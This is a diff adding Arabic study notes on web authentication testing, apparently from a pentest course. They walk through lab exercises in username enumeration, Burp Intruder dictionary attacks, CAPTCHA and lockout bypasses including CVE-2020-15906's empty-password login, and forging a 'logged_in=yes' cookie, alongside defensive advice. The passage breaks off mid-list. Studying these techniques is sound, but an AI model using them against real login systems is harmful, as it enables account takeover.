+&gt; هو إنك تعرف هل الـ **username/email موجود في السيستم ولا لأ** بدون ما تكون عارف الباسورد.
+
+يعني بدل ما تهاجم blind، بتبقى عارف:
+
+- مين users الحقيقيين
+- ومين لأ
+
+---
+
+# 💡 الفكرة الأساسية
+
+الـ vulnerability دي بتحصل لما:
+
+&gt; السيرفر يرد بشكل مختلف حسب إذا كان الـ username موجود أو لا
+
+---
+
+## 👇 مثال واضح جدًا
+
+### الحالة الغلط (Vulnerable):
+
+Username صحيح + Password غلط → "Wrong password"  
+Username غلط → "User does not exist"
+
+💥 هنا حصل leak:
+
+- عرفت إن اليوزر موجود لما قالك "password غلط"
+
+---
+
+### الحالة الصح (Secure):
+
+Invalid username or password
+
+✔️ نفس الرسالة في كل الحالات → مفيش leak
+
+---
+
+# 🧠 ليه الموضوع مهم؟
+
+الشرح قال نقطة قوية جدًا:
+
+&gt; Username Enumeration = خطوة قبل Brute Force
+
+---
+
+## بدل ما تعمل:
+
+username + password brute force
+
+## بتعمل:
+
+1. تجيب usernames الصح  
+2. بعدين تهاجم passwords بس
+
+💥 ده يخلي الهجوم:
+
+- أسرع
+- أدق
+- أخطر
+
+---
+
+# 📍 فين نختبرها؟
+
+أي مكان فيه Authentication:
+
+### 1. Login Page
+
+### 2. Register Page
+
+### 3. Forgot Password 🔥 (أهم واحد)
+
+---
+
+# 💣 ليه Forgot Password مهم جدًا؟
+
+لأنه:
+
+- محتاج يعرف إذا الإيميل موجود
+- عشان يبعث reset link
+
+---
+
+## مثال:
+
+### ❌ Vulnerable:
+
+"This email does not exist"
+
+### ✅ Secure:
+
+"If this account exists, we sent an email"
+
+---
+
+# ⚠️ طرق اكتشاف الـ Enumeration
+
+مش بس الرسائل!
+
+---
+
+## 1. Error Messages
+
+زي:
+
+- invalid username
+- wrong password
+
+---
+
+## 2. HTTP Response
+
+- Status code مختلف
+- Content مختلف
+
+---
+
+## 3. Response Length 🔥
+
+زي ما شفت في اللاب:
+
+- Invalid user → response length = 1524
+- Valid user → response length = 1434
+
+💥 فرق صغير = معلومة كبيرة
+
+---
+
+## 4. Response Time
+
+- user موجود → query DB → أبطأ
+- user مش موجود → أسرع
+
+---
+
+# 🧪 شرح اللاب خطوة خطوة (أهم جزء)
+
+## 🧩 الهدف:
+
+نلاقي usernames valid باستخدام Burp Suite
+
+---
+
+## 🥇 Step 1: نلاقي نقطة الضعف
+
+راح على:
+
+Forgot Password
+
+وجرب:
+
+alexis → not valid  
+admin → secret question ظهر
+
+💥 كده عرفنا إن:
+
+admin → valid user
+
+---
+
+## 🥈 Step 2: نستخدم Burp Suite
+
+### نشغل:
+
+- Proxy → Intercept ON
+
+### نعمل request:
+
+submit username
+
+---
+
+## 🥉 Step 3: نبعت request لـ Intruder
+
+- Right click → Send to Intruder
+
+---
+
+## ⚙️ Step 4: نحدد مكان الحقن (Payload)
+
+username=§alexis§
+
+---
+
+## 📂 Step 5: نحط wordlist
+
+مثلاً:
+
+- metasploit usernames
+- default users
+
+---
+
+## 🚀 Step 6: Start Attack
+
+---
+
+# 🔍 Step 7: تحليل النتائج (أهم خطوة)
+
+### بص على:
+
+## 1. Response Length
+
+- المختلف = valid
+
+## 2. Response Content
+
+- فيه message مختلف
+
+---
+
+## في اللاب:
+
+admin → length مختلف → VALID  
+غيره → نفس الطول → INVALID
+
+---
+
+# 🧠 Smart Trick (مهم جدًا)
+
+استخدم:
+
+### Grep Match في Burp
+
+مثلاً:
+
+"not a valid username"
+
+✔️ أي response فيه الجملة → INVALID  
+✔️ اللي مش فيها → VALID
+
+---
+
+# 🔥 الخلاصة العملية (Attack Flow)
+
+1. اكتشف Enumeration  
+2. اجمع usernames valid  
+3. استخدمهم في:  
+   - Brute Force  
+   - Dictionary Attack  
+   - Credential Stuffing
+
+---
+
+# 🛡️ ازاي نحمي منها (مهم في الانترفيو)
+
+قول دايمًا:
+
+- استخدام نفس error message
+- Rate limiting
+- CAPTCHA
+- Logging &amp; monitoring
+- MFA
+
+---
+
+# 🧠 ربطها بالواقع (Bug Bounty)
+
+دي من أكتر الحاجات اللي بتظهر في:
+
+- Forgot Password
+- APIs
+- Mobile apps
+</code></pre>
+<p>Testing for weak password Policy :
+[^6]</p>
+<p>[^6]: # أولًا: الجزء النظري – Weak Password Policy</p>
+<pre><code>## 📌 يعني إيه Weak Password Policy؟
+
+ببساطة:  
+هو إن الويب أبليكيشن **ما بيجبرش المستخدمين يستخدموا باسورد قوية**.
+
+يعني يسمح بحاجات زي:
+
+- `123456`
+- `password`
+- `qwerty`
+- `Christmas` (زي اللي حصل في اللاب 😄)
+
+وده خطر جدًا لأنه بيسهل على المهاجمين يخمنوا الباسورد.
+
+---
+
+## 📌 ليه الموضوع ده مهم؟
+
+لأن:
+
+- المستخدمين بطبعهم بيحبوا الباسورد السهلة
+- لو السيستم مش بيجبرهم → الحسابات بتبقى ضعيفة
+- النتيجة → **Unauthorized Access + Data Breach**
+
+---
+
+## 📌 السيستم المفروض يعمل إيه؟
+
+لازم يفرض Password Policy زي:
+
+- Minimum length (مثلاً ≥ 8)
+- Uppercase + lowercase
+- Numbers
+- Symbols
+- منع الباسورد الشائعة
+
+---
+
+# 🔹 الفرق المهم (بيجي في الامتحانات ⚠️)
+
+## 🟢 Dictionary Attack
+
+- بتستخدم **Wordlist جاهزة**
+- فيها باسوردات مشهورة أو leaked
+
+مثال:
+
+- rockyou.txt
+- secLists
+
+👉 الهدف:  
+تشوف هل المستخدم بيستخدم باسورد شائعة ولا لأ
+
+---
+
+## 🔴 Brute Force Attack
+
+- بتجرب **كل الاحتمالات الممكنة**
+- بتولد الباسوردات بنفسك
+
+مثال:
+
+aaa  
+aab  
+aac  
+...
+
+👉 الهدف:  
+تكسر الباسورد حتى لو مش موجودة في wordlist
+
+---
+
+## 🔥 الفرق المختصر:
+
+|النوع|بيعتمد على|السرعة|
+|---|---|---|
+|Dictionary|كلمات جاهزة|أسرع|
+|Brute Force|كل الاحتمالات|أبطأ جدًا|
+
+---
+
+# 🔹 الحاجات اللي بتختبرها كـ Pentester
+
+### 1. Password Complexity
+
+هل فيه:
+
+- طول معين؟
+- شروط؟
+
+---
+
+### 2. Rate Limiting / Lockout
+
+هل:
+
+- بعد 3-5 محاولات الحساب بيتقفل؟
+- فيه delay؟
+
+---
+
+### 3. Error Messages
+
+هل الرسائل:
+
+- بتقول "Invalid credentials" (كويس ✅)
+- ولا بتقول:
+    - "Password too short" ❌
+    - "User not found" ❌
+
+👉 دي بتساعد في **User Enumeration**
+
+---
+
+# 🔹 ثانيًا: شرح اللاب خطوة خطوة 🔥
+
+## 🎯 الهدف
+
+تكسر باسورد ال admin باستخدام **Dictionary Attack**
+
+---
+
+## 🧠 Step 1: فهم السيناريو
+
+عندك:
+
+- Login page
+- Email معروف:
+
+admin@secbank.com
+
+👉 يعني أنت مش محتاج تعمل User Enumeration
+
+---
+
+## 🧠 Step 2: التقاط الريكوست
+
+باستخدام:
+
+- Burp Suite
+
+بتعمل:
+
+1. تشغل Proxy
+2. تدخل أي باسورد
+3. تمسك الـ request
+
+هيكون POST request فيه:
+
+email=admin@secbank.com  
+password=xxxx
+
+---
+
+## 🧠 Step 3: إرسال إلى Intruder
+
+- Right Click → Send to Intruder
+- Positions → Clear
+- تحدد مكان الباسورد بس
+
+---
+
+## 🧠 Step 4: اختيار نوع الهجوم
+
+- Attack type: **Sniper**
+
+👉 لأنك بتغير parameter واحد (password)
+
+---
+
+## 🧠 Step 5: تحميل Wordlist
+
+بتستخدم:
+
+- قائمة فيها 100 باسورد شائعة
+
+---
+
+## 🧠 Step 6: تشغيل الهجوم
+
+- Start Attack
+- تراقب:
+    - Length
+    - Response
+
+---
+
+## 🧠 Step 7: اكتشاف الباسورد
+
+كل الردود:
+
+Invalid credentials
+
+إلا واحد 👇
+
+- Length مختلف (511)
+- فيه:
+
+admin: true
+
+👉 الباسورد:
+
+Christmas
+
+---
+
+## 🧠 Step 8: تسجيل الدخول
+
+تحط:
+
+- email: admin@secbank.com
+- password: Christmas
+
+✅ Login successful
+
+---
+
+# 🔥 أهم استنتاجات من اللاب
+
+## ❌ السيستم فيه مشاكل:
+
+1. مفيش Password Policy
+2. مفيش Rate Limiting
+3. سمح بباسورد سهلة جدًا
+
+---
+
+## ✅ كـ Pentester هتكتب في التقرير:
+
+### Vulnerability:
+
+Weak Password Policy
+
+### Impact:
+
+- Account takeover
+- Sensitive data exposure
+
+### Recommendation:
+
+- Enforce strong password rules
+- Implement rate limiting
+- Use MFA
+
+---
+
+# 🔥 خلاصة مهمة جدًا (احفظها)
+
+- Weak Password Policy = باب مفتوح للهجوم
+- Dictionary = أسرع وأسهل
+- Brute Force = أبطأ لكن أقوى
+- لازم دايمًا تختبر:
+    - Policy
+    - Lockout
+    - Error messages
+</code></pre>
+<p>CAPTCHA bypass :
+[^7]</p>
+<p>[^7]: # CAPTCHA Bypass &amp; Types – Quick Notes</p>
+<pre><code>## 📌 أولًا: إيه هو CAPTCHA؟
+
+- Mechanism بيستخدمه السيرفر عشان يفرق بين:
+    - 👤 Human
+    - 🤖 Bot
+- الهدف: منع الـ **automation attacks** (زي brute force)
+
+---
+
+# 🔢 أنواع الـ CAPTCHA
+
+## 🟢 1. Arithmetic-based CAPTCHA
+
+### 📖 الفكرة:
+
+- سؤال حسابي بسيط:
+    - `3 + 5 = ?`
+
+### ⚠️ نقاط الضعف:
+
+- سهل جدًا للأتمتة (script يحسبها)
+- predictable أحيانًا
+- ممكن يكون client-side
+
+### 🔥 Bypass:
+
+- استخراج المعادلة من response
+- حلها باستخدام script (`eval`)
+- إرسال الإجابة مع request
+
+---
+
+## 🟢 2. Text-based CAPTCHA
+
+### 📖 الفكرة:
+
+- صورة فيها حروف/أرقام مشوشة
+
+### ⚠️ نقاط الضعف:
+
+- OCR tools تقدر تقرأ النص
+- أحيانًا distortion ضعيف
+
+### 🔥 Bypass:
+
+- استخدام OCR (زي Tesseract)
+- أو manual solving services
+
+---
+
+## 🟢 3. Image-based CAPTCHA
+
+### 📖 الفكرة:
+
+- اختار صور معينة:
+    - عربيات 🚗
+    - إشارات 🚦
+
+### ⚠️ نقاط الضعف:
+
+- AI models تقدر تتعرف على الصور
+- predictable datasets
+
+### 🔥 Bypass:
+
+- AI/ML models
+- أو خدمات بشرية
+
+---
+
+## 🟢 4. reCAPTCHA v2 (Checkbox / Image Challenge)
+
+### 📖 من Google
+
+- "I'm not a robot"
+- أو image challenge
+
+---
+
+### ⚠️ نقاط الضعف:
+
+- عدم التحقق server-side
+- token reuse
+- CAPTCHA optional
+- مش مربوط بالـ action
+
+---
+
+### 🔥 Bypass:
+
+- حذف `g-recaptcha-response` وتجربة الطلب
+- إعادة استخدام نفس التوكن
+- استخدام خدمات زي:
+    - 2Captcha
+- استغلال logic flaws
+
+---
+
+## 🟢 5. reCAPTCHA v3 (Invisible)
+
+### 📖 الفكرة:
+
+- بدون interaction
+- بيعتمد على **score (0 → 1)**
+
+---
+
+### ⚠️ نقاط الضعف:
+
+- threshold ضعيف
+- السيرفر مش بيتحقق من score
+- token reuse
+- مش مربوط بالـ action
+
+---
+
+### 🔥 Bypass:
+
+- إرسال request بدون تحقق
+- reuse token
+- automation بسلوك شبه إنسان
+- استغلال misconfiguration
+
+---
+
+## 🟢 6. 2Captcha (Service مش نوع)
+
+### 📖 الفكرة:
+
+- خدمة بتحل CAPTCHA باستخدام بشر
+- بتستخدم API
+
+---
+
+### 🔥 الاستخدام:
+
+- تبعت CAPTCHA
+- تستقبل الحل
+- تستخدمه في request
+
+---
+
+# 🧪 طرق اختبار CAPTCHA (Pentester Checklist)
+
+## 🔍 1. تحليل request
+
+- دور على:
+    - `captcha`
+    - `g-recaptcha-response`
+
+---
+
+## 🧪 2. اختبارات أساسية:
+
+### ✔️ حذف CAPTCHA
+
+- هل الطلب بيعدي؟
+
+---
+
+### ✔️ إدخال قيمة عشوائية
+
+- هل السيرفر بيتحقق فعلاً؟
+
+---
+
+### ✔️ إعادة استخدام التوكن
+
+- هل ينفع reuse؟
+
+---
+
+### ✔️ تجاهل CAPTCHA بالكامل
+
+- هل backend بيعتمد عليه؟
+
+---
+
+### ✔️ تغيير flow
+
+- هل ممكن skip step؟
+
+---
+
+---
+
+# 🔥 Common Bypass Techniques
+
+- ❌ No server-side validation
+- 🔁 Token reuse
+- 🧠 Logic flaws
+- 🤖 Automation (scripts / bots)
+- 👨‍💻 Human solving services
+- ⏱️ Race conditions
+- 🌐 تغيير IP (لو فيه rate limit)
+
+---
+
+# ⚠️ أخطاء شائعة في التطبيقات
+
+- CAPTCHA في الـ UI فقط
+- عدم ربط CAPTCHA بالـ session
+- عدم ربطه بالـ action
+- عدم وجود expiration
+- قبول أي token
+
+---
+
+# 🧠 الخلاصة المهمة
+
+&gt; CAPTCHA مش حماية كاملة ❌  
+&gt; هو مجرد **طبقة إضافية**
+
+✔️ الأمان الحقيقي لازم يشمل:
+
+- Rate limiting
+- Account lockout
+- Monitoring
+</code></pre>
+<p>Account Lockout Bypass :
+[^8]</p>
+<p>[^8]: أولًا: يعني إيه Account Lockout؟</p>
+<pre><code>    ببساطة:
+
+    **Account Lockout** هو Policy بيحمي الحسابات من هجمات الـ brute force.
+
+    يعني:
+
+    - لو حاولت تدخل باسورد غلط كذا مرة (مثلاً 5 أو 10 مرات)
+    - السيستم يعمل **Lock للحساب**
+    - ومش هتعرف تدخل تاني إلا بعد:
+        - وقت معين (15 دقيقة مثلًا)
+        - أو Admin يفكّه
+
+    👉 الهدف: يمنع الهاكر من تجربة آلاف الباسوردات
+
+    ---
+
+    ## ⚙️ أنواع الـ Lockout
+
+    1. **Time-based**
+        - الحساب يتقفل لمدة (مثلاً 15 دقيقة)
+    2. **Admin unlock**
+        - لازم الأدمن يفكّه يدويًا
+    3. **Progressive delay**
+        - كل محاولة غلط = انتظار أطول
+
+    ---
+
+    ## 🧪 في اللاب حصل إيه؟
+
+    التارجت كان CMS اسمه:
+
+    ➡️ Tiki Wiki CMS Groupware
+
+    ### السيناريو:
+
+    4. لقي Login page
+    5. بدأ يجرب login
+    6. استخدم:
+        - Burp Suite (Intruder)
+    7. عمل **dictionary attack** على الباسورد
+
+    ---
+
+    ## 🔍 اكتشاف الـ Lockout
+
+    بعد ~50 محاولة:
+
+    📌 الريسبونس اتغير:
+
+    - بدل: `Invalid username/password`
+    - بقى:  
+        ➜ "Account requires administrator approval"
+
+    👉 كده عرفنا:
+
+    - فيه Lockout بعد 50 محاولة
+
+    ---
+
+    ## ⚠️ فين المشكلة (Vulnerability)؟
+
+    المفروض بعد الـ lock:
+
+    - مفيش login خالص ❌
+
+    لكن اللي حصل 👇
+
+    ### 💥 المفاجأة:
+
+    لو بعت request فيها:
+
+    username=admin  
+    password= (empty)
+
+    ✅ دخل عادي!!
+
+    ---
+
+    ## 🧠 ده معناه إيه؟
+
+    ده يعتبر:
+
+    ### 1. Weak Lockout Mechanism
+
+    - السيستم بيقفل الحساب
+    - بس مش بيمنع كل الحالات
+
+    ### 2. Authentication Bypass
+
+    - تقدر تدخل من غير باسورد أصلاً
+
+    ---
+
+    ## 🚨 الـ CVE اللي اتكلم عنها
+
+    الثغرة دي مرتبطة بـ:
+
+    ➡️ CVE-2020-15906
+
+    ### 📌 تفاصيلها:
+
+    - بتأثر على Tiki Wiki version 21.x
+    - فيها:
+        - Rate limiting (50 محاولة)
+        - لكن فيه bug في التحقق
+
+    ### 💥 سبب الثغرة:
+
+    - السيستم بعد ما يعمل lock
+    - بيبقى فيه logic flaw:
+        - لو الباسورد فاضي → بيعدّي validation
+
+    👉 يعني:
+
+    if(password == "") → bypass
+
+    ---
+
+    ## 🔗 ليه دي خطيرة؟
+
+    - تقدر:
+        - تدخل Admin بدون باسورد
+        - تاخد Full control
+    - ده = **Critical vulnerability**
+
+    ---
+
+    ## 🧪 خطوات الاختبار (Pentest Methodology)
+
+    ### 1. Identify login
+
+    - صفحة login
+
+    ### 2. Brute force
+
+    - باستخدام Intruder
+
+    ### 3. Monitor responses
+
+    - شوف:
+        - Length
+        - Status
+        - Messages
+
+    ### 4. Detect lockout
+
+    - لما الرسالة تتغير
+
+    ### 5. Try bypass techniques
+
+    زي:
+
+    - Empty password
+    - Null byte
+    - تغيير request
+    - حذف parameters
+
+    ---
+
+    ## 💡 أفكار bypass شائعة
+
+    غير اللي في الفيديو:
+
+    - تغيير IP (لو lockout per IP)
+    - تغيير Username case
+    - استخدام password = ""
+    - إرسال request ناقص
+    - Race condition
+
+    ---
+
+    ## 🧠 الخلاصة
+
+    المحاضرة دي بتعلمك 3 حاجات مهمين جدًا:
+
+    ### 1. مش كل Lockout = حماية
+
+    ممكن يكون:
+
+    &gt; موجود بس ضعيف
+
+    ### 2. لازم تختبر بعد الـ Lockout
+
+    مش تقف عند:
+
+    &gt; "الحساب اتقفل وخلاص"
+
+    ### 3. الربط بين vulnerabilities
+
+    هنا عندك:
+
+    - Lockout
+    - Rate limiting
+    - Authentication bypass
+
+    ---
+
+    ## 🔥 ملخص سريع
+
+    - Account Lockout = حماية من brute force
+    - في اللاب:
+        - بعد 50 محاولة الحساب اتقفل
+        - لكن بـ empty password → دخل
+    - ده بسبب:
+        - Logic flaw
+    - CVE:
+        - CVE-2020-15906
+    - النتيجة:
+        - Full account takeover
+
+Bypassing Authentication Schema_ Parameter Manipulation :
+[^9]
+
+[^9]: # أولًا: يعني إيه Authentication Schema؟
+
+    ببساطة:
+
+    **Authentication Schema = الطريقة/المنظومة اللي السيستم بيتأكد بيها إنك مستخدم حقيقي**
+
+    يعني تشمل:
+
+    - login form (username/password)
+    - sessions (cookies)
+    - tokens (JWT)
+    - APIs
+
+    👉 كل ده مع بعض هو الـ schema (المنظومة)
+
+    ---
+
+    # 💥 يعني إيه Bypassing Authentication Schema؟
+
+    ده أخطر جزء 👇
+
+    بدل ما:
+
+    - تحزر الباسورد ❌
+    - أو تعمل brute force ❌
+
+    أنت:
+
+    &gt; ❗ **تعدّي السيستم من غير ما تستخدم credentials أصلاً**
+
+    يعني:
+
+    - لا password
+    - ولا login
+    - ولا verification
+
+    👉 تدخل كأنك authenticated
+
+    ---
+
+    # 🧩 الفرق بين الطرق
+
+    خلّي بالك من الفرق ده 👇
+
+    |النوع|بتستخدم credentials؟|مثال|
+    |---|---|---|
+    |Brute force|✅|تخمين باسورد|
+    |Lockout bypass|✅ جزئيًا|تتخطى الحماية|
+    |Authentication bypass|❌|تدخل من غير باسورد|
+
+    ---
+
+    # 🎯 هدف الاختبار ده (حسب OWASP)
+
+    في الـ OWASP WSTG test:
+
+    ### الهدف:
+
+    - تكتشف:
+        - هل ينفع تدخل بدون login؟
+        - هل في logic غلط؟
+        - هل في endpoints مفتوحة؟
+
+    ---
+
+    # ⚠️ أهم أنواع المشاكل (نظريًا)
+
+    ## 1. Unprotected Endpoints
+
+    يعني:
+
+    - فيه route زي:
+
+    GET /admin
+
+    ومفيش authentication عليه 😅
+
+    👉 تدخل Admin مباشرة
+
+    ---
+
+    ## 2. Default Credentials
+
+    زي:
+
+    admin:admin  
+    root:root
+
+    👉 موجودة في:
+
+    - config files
+    - APIs
+    - systems قديمة
+
+    ---
+
+    ## 3. Weak Access Control
+
+    يعني:
+
+    - user عادي يقدر يشوف:
+        - /admin
+        - /dashboard
+
+    👉 ده اسمه:  
+    **Privilege Escalation**
+
+    ---
+
+    ## 🔥 4. Parameter Manipulation (نقطة الفيديو الأساسية)
+
+    دي أهم نقطة 👇
+
+    ---
+
+    # 🧠 يعني إيه Parameter Manipulation؟
+
+    يعني:
+
+    &gt; ❗ تغيير قيم في الـ request علشان تخدع السيستم
+
+    الـ parameters ممكن تكون:
+
+    - URL
+    - POST data
+    - Cookies
+    - Headers
+
+    ---
+
+    # 💣 الفكرة الأساسية
+
+    السيستم ساعات بيعمل حاجة غبية:
+
+    if (logged_in == "yes") {  
+       give_access();  
+    }
+
+    ❗ المشكلة؟
+
+    - هو واثق في الـ parameter اللي جاي من المستخدم!
+
+    ---
+
+    # 🧪 مثال بسيط
+
+    Request طبيعي:
+
+    GET /admin  
+    Cookie: logged_in=no
+
+    👉 مرفوض ❌
+
+    لكن لو غيرتها:
+
+    GET /admin  
+    Cookie: logged_in=yes
+
+    👉 Boom 💥 دخلت Admin
+
+    ---
+
+    # 😳 ليه ده بيحصل؟
+
+    بسبب:
+
+    ## ❌ Missing Server-side Validation
+
+    السيستم:
+
+    - مش بيتأكد من session حقيقي
+    - بيعتمد على input من user
+
+    ---
+
+    # ⚠️ دي تعتبر إيه؟
+
+    دي واحدة من أخطر الحاجات:
+
+    👉 **Broken Authentication**
+
+    ---
+
+    # 🧠 ليه اسمها “Schema Bypass”؟
+
+    لأنك:
+
+    - مش بتكسر password
+    - ولا session
+
+    ❗ أنت بتعدّي **المنظومة كلها**
+
+    ---
+
+    # 🧪 أنواع Parameter Manipulation
+
+    ## 1. Cookies
+
+    زي المثال:
+
+    logged_in=yes  
+    isAdmin=true
+
+    ---
+
+    ## 2. URL parameters
+
+    ?role=admin  
+    ?auth=true
+
+    ---
+
+    ## 3. POST data
+
+    username=admin  
+    role=admin
+
+    ---
+
+    ## 4. Headers
+
+    X-User-Role: admin
+
+    ---
+
+    # 🧠 نقطة ذكية جدًا في الفيديو
+
+    المحاضر قال:
+
+    &gt; ممكن السيستم يقوي login page جدًا  
+    &gt; بس يسيب API مفتوح 😏
+
+    ---
+
+    ## 💥 مثال حقيقي
+
+    - Login قوي (CAPTCHA + MFA)
+    - لكن:
+
+    GET /api/admin/users
+
+    👉 بدون auth
+
+    ---
+
+    # 🧠 الفكرة الذهبية
+
+    في pentest:
+
+    &gt; ❗ متبصش على login بس… بص على كل الطرق
+
+    ---
+
+    # 🧪 خطوات التفكير (Pentester Mindset)
+
+    1. شوف login طبيعي
+    2. اعمل intercept
+    3. راقب:
+        - cookies
+        - parameters
+    4. جرّب:
+        - تغيير values
+        - إضافة parameters
+        - حذف parameters
+
+    ---
+
+    # 🔥 خلاصة المحاضرة
+
+    - Authentication schema = نظام التحقق
+    - Bypass = تعدّي النظام كله
+    - Parameter manipulation = تغيير request values
+    - السبب:
+        - Trust في user input ❌
+    - النتيجة:
+        - login بدون credentials 💀
+# سيناريو اللاب باختصار
+
+عندك Web App (airline booking system)
+
+وفيه:
+
+- صفحة عادية
+- و **Admin panel**
+
+المفروض:
+
+&gt; ❌ متدخلهاش إلا لو عامل login
+
+لكن اللي حصل:
+
+&gt; ✅ دخلنا Admin من غير login
+
+---
+
+# 🧠 الفكرة الأساسية في اللاب
+
+السيستم كان بيعتمد على Cookie اسمها:
+
+logged_in = yes
+
+👉 لو موجودة → يعتبرك Admin  
+👉 لو مش موجودة → يرفضك
+
+❗ ودي مصيبة… لأنه واثق في حاجة جاية من المستخدم!
+
+---
+
+# ⚙️ الأدوات المستخدمة
+
+- Browser
+- Burp Suite
+
+---
+
+# 🚶‍♂️ خطوات اللاب بالتفصيل
+
+---
+
+## 1️⃣ فتح الـ Admin Page
+
+دخل على:
+
+/admin
+
+📌 النتيجة:
+
+- "You are not logged in" ❌
+
+---
+
+## 2️⃣ تشغيل Intercept
+
+في Burp:
+
+- Proxy → Intercept ON
+
+---
+
+## 3️⃣ إعادة تحميل الصفحة
+
+عمل refresh للـ /admin
+
+📌 Burp مسك Request زي ده:
+
+GET /admin HTTP/1.1  
+Host: target.com  
+User-Agent: Mozilla...  
+Accept: text/html
+
+---
+
+## 4️⃣ هنا بقى الشغل الحقيقي 🔥
+
+بدل ما تبعت request عادي  
+بتبدأ “تلعب” فيه
+
+### تضيف Cookie مزيفة:
+
+Cookie: logged_in=yes
+
+---
+
+## 5️⃣ إرسال الـ Request
+
+عمل:
+
+- Forward في Burp
+
+---
+
+## 💥 النتيجة:
+
+👉 دخل Admin panel مباشرة 😳
+
+---
+
+# 🧠 ليه حصل كده؟
+
+السيستم كان بيعمل حاجة زي كده:
+
+if(cookie.logged_in == "yes") {  
+    grant_admin_access();  
+}
+
+❗ بدون:
+
+- session validation
+- token check
+- authentication logic
+
+---
+
+# 🔁 نقطة مهمة جدًا حصلت في اللاب
+
+المحاضر قال:
+
+&gt; مش أول request هو اللي اشتغل… التاني
+
+ليه؟ 🤔
+
+---
+
+## 📌 السبب:
+
+بعض التطبيقات:
+
+- بتطلب request أولاني (redirect)
+- وبعدين request تاني هو اللي فيه validation
+
+👉 فلازم:
+
+- تحط الكوكي في **الـ request الصح**
+
+---
+
+# 🧪 حل عملي في اللاب
+
+## بدل ما تضيف cookie كل مرة:
+
+استخدم:
+
+- Cookie Editor extension
+
+وضيف:
+
+logged_in = yes
+
+👉 كده:
+
+- كل requests تبقى authenticated تلقائي
+
+---
+
+# 🔥 النتيجة النهائية
+
+- دخلت Admin
+- تقدر:
+    - تضيف Flights
+    - تعدل النظام
+    - تتحكم بالكامل
+
+---
+
+# ⚠️ نوع الثغرة دي
+
+دي تعتبر:
+
+👉 Broken Authentication  
+👉 Parameter Manipulation  
+👉 Authentication Bypass
+
+---
+
+# 🧠 أهم الدروس من اللاب
+
+## 1. متثقش في الـ client input
+
+أي حاجة جاية من:
+
+- cookie
+- header
+- parameter
+
+❗ ممكن تتزوّر
+
+---
+
+## 2. دايمًا جرّب تعديل الطلبات
+
+حتى لو مفيش login:
+
+- أضف parameters
+- غيّر cookies
+- احذف values
+
+---
+
+## 3. تابع كل request مش واحد بس
+
+- الأول ممكن fail
+- التاني ينجح
+
+---
+
+# 💡 Hackers Mindset 🧠
+
+وأنت بتعمل pentest:
+
+&gt; “إيه الحاجة اللي السيستم واثق فيها زيادة؟”
+
+👉 غالبًا هي دي نقطة الدخول
+
+---
+
+# 🔥 خلاصة اللاب في سطر واحد
+
+&gt; بدل ما تثبت إنك Admin… خلت السيستم يصدق إنك Admin 😏
+</code></pre>
+<p>Cookies :</p>
+<p>[^10]</p>
+<p>[^10]: # أولًا: يعني إيه Cookies؟</p>
+<pre><code>ببساطة:
+
+&gt; **Cookie = ملف صغير بيتخزن في المتصفح علشان الموقع “يفتكرك”**
+
+📌 بيخزن:
+
+- Session ID
+- login state
+- preferences (dark mode / language)
+- shopping cart
+
+---
+
+# 🔥 ليه Cookies مهمة جدًا؟
+
+لأنها:  
+👉 هي اللي شايلة **Session ID**
+
+يعني:
+
+- من غير Cookie → مفيش Session
+- من غير Session → لازم تعمل login كل request 😅
+
+---
+
+# 🧠 Cookies بتشتغل إزاي؟
+
+## السيناريو:
+
+### 1) تعمل Login
+
+POST /login  
+username=admin&amp;password=123
+
+---
+
+### 2) السيرفر يرد:
+
+Set-Cookie: sessionid=abc123
+
+👉 كده الكوكي اتخزنت عندك
+
+---
+
+### 3) أي request بعد كده:
+
+GET /dashboard  
+Cookie: sessionid=abc123
+
+👉 السيرفر يقول:
+
+- آه ده نفس الشخص → دخّله
+
+---
+
+# ⚙️ Cookie Parameters (أهم جزء 🔥)
+
+دي إعدادات بتحدد:
+
+&gt; الكوكي تتستخدم إزاي + قد إيه آمنة
+
+---
+
+## 🛡️ 1) HttpOnly
+
+### وظيفته:
+
+- يمنع JavaScript من الوصول للكوكي
+
+### ليه مهم؟
+
+يحمي من:
+
+&gt; ❌ XSS
+
+---
+
+### 🔴 بدون HttpOnly:
+
+document.cookie
+
+→ يسرق session 😈
+
+---
+
+### 🟢 مع HttpOnly:
+
+- JS مش هيشوف الكوكي
+
+---
+
+## 🔐 2) Secure
+
+### وظيفته:
+
+- الكوكي تتبعت **بس على HTTPS**
+
+---
+
+### ليه مهم؟
+
+يحمي من:
+
+&gt; ❌ Man-in-the-Middle (MITM)
+
+---
+
+### 🔴 بدون Secure:
+
+- الكوكي ممكن تتبعت على HTTP
+- أي حد sniffing يسرقها
+
+---
+
+### 🟢 مع Secure:
+
+- الكوكي encrypted
+
+---
+
+## 🌍 3) SameSite (مهم جدًا جدًا)
+
+### وظيفته:
+
+- يمنع إرسال الكوكي في cross-site requests
+
+👉 يحمي من:
+
+&gt; ❌ CSRF
+
+---
+
+## أنواعه:
+
+### 🟥 Strict
+
+- الكوكي تتبعت **بس داخل نفس الموقع**
+
+🔒 أقوى حماية  
+❌ بس ممكن يكسر functionality
+
+---
+
+### 🟨 Lax
+
+- وسط:
+    - يسمح ببعض requests (GET)
+
+👉 الأكثر استخدامًا
+
+---
+
+### 🟩 None
+
+- الكوكي تتبعت في أي request
+
+❗ لازم يكون:
+
+Secure
+
+---
+
+# ⏳ 4) Expiration / Max-Age
+
+### وظيفته:
+
+- يحدد عمر الكوكي
+
+---
+
+## نوعين:
+
+### 🟢 Session Cookie
+
+- تمسح لما تقفل المتصفح
+
+---
+
+### 🔵 Persistent Cookie
+
+- بتفضل شغالة وقت معين
+
+---
+
+### ليه مهم؟
+
+👉 لو طويلة جدًا:
+
+- session ممكن تتسرق وتفضل شغالة 😬
+
+---
+
+# 🧾 مثال حقيقي (مهم جدًا)
+
+Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax; Path=/
+
+### نفهمها:
+
+|الجزء|معناه|
+|---|---|
+|sessionid=abc123|ده الـ session|
+|HttpOnly|JS مش يشوفه|
+|Secure|HTTPS فقط|
+|SameSite=Lax|حماية CSRF|
+|Path=/|متاح لكل الموقع|
+
+---
+
+# 💀 كـ Pentester تدور على إيه؟
+
+دي أهم نقطة 👇🔥
+
+---
+
+## 🚨 1) Cookie بدون HttpOnly
+
+👉 خطر:
+
+- XSS → سرقة session
+
+---
+
+## 🚨 2) Cookie بدون Secure
+
+👉 خطر:
+
+- MITM → sniffing
+
+---
+
+## 🚨 3) SameSite = None
+
+👉 خطر:
+
+- CSRF attack
+
+---
+
+## 🚨 4) Expiration طويل جدًا
+
+👉 خطر:
+
+- session reuse
+
+---
+
+## 🚨 5) Cookie فيها sensitive data
+
